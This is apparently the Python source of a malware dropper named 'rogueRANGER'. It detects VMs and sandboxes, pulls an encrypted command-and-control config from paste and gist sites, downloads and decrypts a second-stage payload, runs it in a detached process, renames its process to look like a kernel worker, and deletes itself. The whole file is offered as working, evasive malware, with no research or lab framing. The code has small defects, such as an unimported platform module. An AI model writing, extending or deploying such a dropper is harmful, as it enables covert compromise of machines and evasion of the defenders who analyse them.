#!/usr/bin/env python3
"""
Stage 1 Dropper for rogueRANGER
Advanced stealth dropper with VM detection and memory-only execution
"""

import os
import sys
import time
import base64
import hashlib
import json
import urllib.request
import urllib.error
import ssl
import subprocess
import tempfile
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Import our detection suite
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from vm_detector import VMSandboxDetector

class StealthyDropper:
    """
    Stage 1: Environment-aware dropper with advanced evasion
    Responsibilities:
    1. Detect VM/sandbox environments
    2. Retrieve encrypted C2 configuration
    3. Download and execute Stage 2 in memory
    4. Clean up artifacts
    """
    
    def __init__(self):
        self.detector = VMSandboxDetector()
        self.config = self.load_config()
        self.stage2_key = None
        self.stage2_payload = None
        
    def load_config(self):
        """Load dropper configuration"""
        return {
            'c2_sources': [
                'https://pastebin.com/raw/XXXXXX',  # Encrypted C2 config
                'https://gist.githubusercontent.com/raw/XXXXXX',  # Backup
                'https://gitlab.com/snippets/XXXXXX/raw',  # Secondary backup
            ],
            'sleep_on_detection': 3600,  # Sleep for 1 hour if sandbox detected
            'max_retries': 3,
            'timeout': 10,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def run(self):
        """Main dropper execution flow"""
        print("[DROPPER] Starting Stage 1 dropper")
        print(f"[DROPPER] PID: {os.getpid()}, Parent: {os.getppid()}")
        
        # 1. Environment analysis
        if self.analyze_environment():
            print("[DROPPER] Environment analysis passed")
        else:
            print("[DROPPER] Environment suspicious - going dormant")
            self.go_dormant()
            return
        
        # 2. Retrieve encrypted C2 configuration
        c2_config = self.retrieve_c2_config()
        if not c2_config:
            print("[DROPPER] Failed to retrieve C2 config")
            self.cleanup_and_exit()
            return
        
        # 3. Download Stage 2 payload
        stage2_data = self.download_stage2(c2_config)
        if not stage2_data:
            print("[DROPPER] Failed to download Stage 2")
            self.cleanup_and_exit()
            return
        
        # 4. Execute Stage 2 in memory
        self.execute_stage2(stage2_data, c2_config)
        
        # 5. Cleanup
        self.cleanup()
    
    def analyze_environment(self):
        """Comprehensive environment analysis"""
        print("[DROPPER] Analyzing environment...")
        
        # Run full VM/sandbox detection
        results = self.detector.run_full_detection()
        
        # Check confidence score
        if results['confidence_score'] >= self.detector.threshold:
            print(f"[DROPPER] High confidence of sandbox: {results['confidence_score']:.1f}")
            print(f"[DROPPER] Indicators: {results['vm_indicators'] + results['sandbox_indicators']}")
            return False
        
        # Additional environment checks
        if not self.check_system_resources():
            return False
        
        if not self.check_network_connectivity():
            return False
        
        print("[DROPPER] Environment analysis passed")
        return True
    
    def check_system_resources(self):
        """Check for adequate system resources"""
        try:
            import psutil
            
            # Check CPU cores
            cores = psutil.cpu_count(logical=False)
            if cores and cores < 2:
                print(f"[DROPPER] Insufficient CPU cores: {cores}")
                return False
            
            # Check memory
            memory = psutil.virtual_memory()
            if memory.total < 1 * 1024**3:  # <1GB
                print(f"[DROPPER] Insufficient memory: {memory.total / 1024**3:.1f}GB")
                return False
            
            # Check disk space
            disk = psutil.disk_usage('/')
            if disk.free < 100 * 1024**2:  # <100MB
                print(f"[DROPPER] Insufficient disk space: {disk.free / 1024**2:.1f}MB")
                return False
            
            return True
            
        except Exception as e:
            print(f"[DROPPER] Resource check failed: {e}")
            return True  # Continue on error
    
    def check_network_connectivity(self):
        """Check for real network connectivity (not sandbox net)"""
        try:
            # Test multiple endpoints
            test_urls = [
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip',
                'https://checkip.amazonaws.com'
            ]
            
            successful_tests = 0
            for url in test_urls:
                try:
                    req = urllib.request.Request(
                        url,
                        headers={'User-Agent': self.config['user_agent']}
                    )
                    
                    # Create SSL context that ignores cert errors
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as response:
                        if response.getcode() == 200:
                            successful_tests += 1
                            data = response.read().decode('utf-8')
                            print(f"[DROPPER] Network test passed: {url}")
                except Exception as e:
                    print(f"[DROPPER] Network test failed for {url}: {e}")
            
            # Require at least 2 successful tests
            if successful_tests >= 2:
                return True
            else:
                print(f"[DROPPER] Insufficient network connectivity: {successful_tests}/3 tests passed")
                return False
                
        except Exception as e:
            print(f"[DROPPER] Network connectivity check failed: {e}")
            return False
    
    def retrieve_c2_config(self):
        """Retrieve encrypted C2 configuration from multiple sources"""
        print("[DROPPER] Retrieving C2 configuration...")
        
        for source in self.config['c2_sources']:
            for attempt in range(self.config['max_retries']):
                try:
                    print(f"[DROPPER] Trying source {source} (attempt {attempt + 1})")
                    
                    req = urllib.request.Request(
                        source,
                        headers={'User-Agent': self.config['user_agent']}
                    )
                    
                    # SSL context
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    
                    with urllib.request.urlopen(req, timeout=self.config['timeout'], context=ctx) as response:
                        if response.getcode() == 200:
                            encrypted_data = response.read()
                            
                            # Try to decrypt
                            config = self.decrypt_config(encrypted_data)
                            if config:
                                print(f"[DROPPER] Successfully retrieved config from {source}")
                                return config
                    
                except urllib.error.URLError as e:
                    print(f"[DROPPER] URL error for {source}: {e}")
                    time.sleep(2 ** attempt)  # Exponential backoff
                except Exception as e:
                    print(f"[DROPPER] Error retrieving from {source}: {e}")
                    time.sleep(1)
        
        print("[DROPPER] All C2 sources failed")
        return None
    
    def decrypt_config(self, encrypted_data):
        """Decrypt C2 configuration using derived key"""
        try:
            # Derive key from system fingerprint
            system_fingerprint = self.get_system_fingerprint()
            key = self.derive_key(system_fingerprint)
            
            # Decrypt with Fernet
            fernet = Fernet(key)
            decrypted = fernet.decrypt(encrypted_data)
            
            # Parse JSON config
            config = json.loads(decrypted.decode('utf-8'))
            
            # Validate config structure
            required_fields = ['stage2_url', 'encryption_key', 'implant_id']
            for field in required_fields:
                if field not in config:
                    print(f"[DROPPER] Missing required field in config: {field}")
                    return None
            
            print(f"[DROPPER] Config decrypted successfully")
            return config
            
        except Exception as e:
            print(f"[DROPPER] Config decryption failed: {e}")
            return None
    
    def get_system_fingerprint(self):
        """Generate unique system fingerprint for key derivation"""
        fingerprint_data = []
        
        try:
            # System information
            fingerprint_data.append(platform.node())  # Hostname
            fingerprint_data.append(platform.machine())  # Architecture
            fingerprint_data.append(str(os.getpid()))  # Process ID
            
            # Network interfaces (first MAC)
            import psutil
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        fingerprint_data.append(addr.address)
                        break
                if len(fingerprint_data) > 3:  # Got at least one MAC
                    break
            
            # Disk serial (if available)
            try:
                if os.path.exists('/sys/block/sda/device/serial'):
                    with open('/sys/block/sda/device/serial', 'r') as f:
                        fingerprint_data.append(f.read().strip())
            except:
                pass
            
        except Exception as e:
            print(f"[DROPPER] Fingerprint collection error: {e}")
        
        # Fallback to basic fingerprint
        if not fingerprint_data:
            fingerprint_data = [str(time.time()), platform.node()]
        
        fingerprint = ':'.join(fingerprint_data)
        print(f"[DROPPER] System fingerprint: {hashlib.md5(fingerprint.encode()).hexdigest()[:16]}")
        
        return fingerprint.encode()
    
    def derive_key(self, fingerprint, salt=b'rogueRANGER_salt'):
        """Derive encryption key from fingerprint"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(fingerprint))
        return key
    
    def download_stage2(self, c2_config):
        """Download Stage 2 payload"""
        print("[DROPPER] Downloading Stage 2 payload...")
        
        stage2_url = c2_config.get('stage2_url')
        if not stage2_url:
            print("[DROPPER] No Stage 2 URL in config")
            return None
        
        for attempt in range(self.config['max_retries']):
            try:
                print(f"[DROPPER] Downloading from {stage2_url} (attempt {attempt + 1})")
                
                req = urllib.request.Request(
                    stage2_url,
                    headers={'User-Agent': self.config['user_agent']}
                )
                
                # SSL context
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                with urllib.request.urlopen(req, timeout=self.config['timeout'], context=ctx) as response:
                    if response.getcode() == 200:
                        encrypted_payload = response.read()
                        
                        # Store for execution
                        self.stage2_key = c2_config.get('encryption_key')
                        self.stage2_payload = encrypted_payload
                        
                        print(f"[DROPPER] Stage 2 downloaded: {len(encrypted_payload)} bytes")
                        return {
                            'encrypted_data': encrypted_payload,
                            'key': self.stage2_key,
                            'implant_id': c2_config.get('implant_id')
                        }
                
            except urllib.error.URLError as e:
                print(f"[DROPPER] Download error: {e}")
                time.sleep(2 ** attempt)
            except Exception as e:
                print(f"[DROPPER] Download failed: {e}")
                time.sleep(1)
        
        print("[DROPPER] Stage 2 download failed after all retries")
        return None
    
    def execute_stage2(self, stage2_data, c2_config):
        """Execute Stage 2 payload in memory"""
        print("[DROPPER] Executing Stage 2...")
        
        try:
            # Decrypt Stage 2
            encrypted_data = stage2_data['encrypted_data']
            key = stage2_data['key']
            
            fernet = Fernet(key)
            decrypted_payload = fernet.decrypt(encrypted_data)
            
            # The payload should be a Python script
            # We'll execute it in a subprocess with the config as environment
            env = os.environ.copy()
            env['ROGUE_CONFIG'] = json.dumps(c2_config)
            env['ROGUE_STAGE2'] = '1'
            
            # Create temporary file (in memory filesystem if possible)
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(decrypted_payload.decode('utf-8'))
                temp_file = f.name
            
            # Execute
            print(f"[DROPPER] Executing Stage 2 from {temp_file}")
            subprocess.Popen(
                [sys.executable, temp_file],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            
            # Don't wait for completion
            print("[DROPPER] Stage 2 launched successfully")
            
            # Schedule cleanup of temp file
            time.sleep(2)
            try:
                os.unlink(temp_file)
                print("[DROPPER] Cleaned up temporary file")
            except:
                pass
                
        except Exception as e:
            print(f"[DROPPER] Stage 2 execution failed: {e}")
    
    def go_dormant(self):
        """Enter dormant state if sandbox detected"""
        sleep_time = self.config['sleep_on_detection']
        print(f"[DROPPER] Going dormant for {sleep_time} seconds")
        
        # Try to hide process
        try:
            # Change process name if possible
            if hasattr(os, 'setproctitle'):
                import setproctitle
                setproctitle.setproctitle('[kworker/u:0]')
        except:
            pass
        
        # Sleep
        time.sleep(sleep_time)
        
        # Optionally retry after sleep
        print("[DROPPER] Waking from dormant state")
        self.run()
    
    def cleanup(self):
        """Clean up dropper artifacts"""
        print("[DROPPER] Cleaning up...")
        
        # Remove dropper script if running from file
        if __file__ and os.path.exists(__file__):
            try:
                os.unlink(__file__)
                print(f"[DROPPER] Removed dropper script: {__file__}")
            except:
                pass
        
        # Clear variables
        self.stage2_key = None
        self.stage2_payload = None
        
        print("[DROPPER] Cleanup complete")
    
    def cleanup_and_exit(self):
        """Clean up and exit gracefully"""
        self.cleanup()
        sys.exit(0)

def main():
    """Main entry point"""
    # Simple anti-debugging: check if we're being imported
    if __name__ != "__main__":
        return
    
    # Create and run dropper
    dropper = StealthyDropper()
    dropper.run()

if __name__ == "__main__":
    main()